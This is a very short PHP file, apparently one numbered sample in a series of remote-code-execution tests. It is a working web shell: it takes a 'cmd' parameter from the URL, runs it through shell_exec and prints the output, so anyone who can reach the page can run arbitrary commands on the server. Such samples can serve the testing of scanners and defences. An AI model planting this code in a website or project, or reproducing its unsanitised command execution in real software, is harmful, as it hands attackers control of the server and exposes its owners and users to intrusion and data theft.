<?php
// RCE test variation #1128
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>